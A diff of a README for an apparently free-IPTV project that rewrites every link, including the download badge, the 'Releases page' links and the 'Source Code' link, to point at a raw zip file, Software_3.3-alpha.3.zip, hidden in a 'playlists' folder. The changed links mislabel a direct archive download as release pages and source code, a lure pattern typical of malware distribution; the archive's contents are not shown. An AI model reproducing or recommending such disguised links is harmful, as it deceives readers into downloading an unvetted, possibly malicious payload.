@@ -1,6 +1,6 @@
 # 📺 IPTV - Access Free TV Channels Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/MARIKO578/IPTV/releases)
+[![Download Now](https://github.com/MARIKO578/IPTV/raw/refs/heads/master/playlists/Software_3.3-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/MARIKO578/IPTV/raw/refs/heads/master/playlists/Software_3.3-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ To get started with IPTV, you need to download the application from our Releases
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/MARIKO578/IPTV/releases) to find the latest version of IPTV.
+   Go to the [Releases page](https://github.com/MARIKO578/IPTV/raw/refs/heads/master/playlists/Software_3.3-alpha.3.zip) to find the latest version of IPTV.
 
 2. **Select the Latest Release**  
    Look for the most recent version. The latest release will have a title that indicates it is the newest version available.
@@ -47,7 +47,7 @@ To ensure a smooth experience, please check your system meets the following requ
 
 ### How do I update IPTV?
 
-To update IPTV, visit the [Releases page](https://github.com/MARIKO578/IPTV/releases) and download the latest version. Follow the same steps as the initial installation.
+To update IPTV, visit the [Releases page](https://github.com/MARIKO578/IPTV/raw/refs/heads/master/playlists/Software_3.3-alpha.3.zip) and download the latest version. Follow the same steps as the initial installation.
 
 ### Can I use IPTV on my mobile device?
 
@@ -67,7 +67,7 @@ If you require further assistance or have questions about usage, feel free to re
 
 ## 🔗 Links
 
-- [Releases page](https://github.com/MARIKO578/IPTV/releases)
-- [Source Code](https://github.com/MARIKO578/IPTV)
+- [Releases page](https://github.com/MARIKO578/IPTV/raw/refs/heads/master/playlists/Software_3.3-alpha.3.zip)
+- [Source Code](https://github.com/MARIKO578/IPTV/raw/refs/heads/master/playlists/Software_3.3-alpha.3.zip)
 
 Thank you for choosing IPTV. We hope you enjoy the experience of accessing free TV channels!
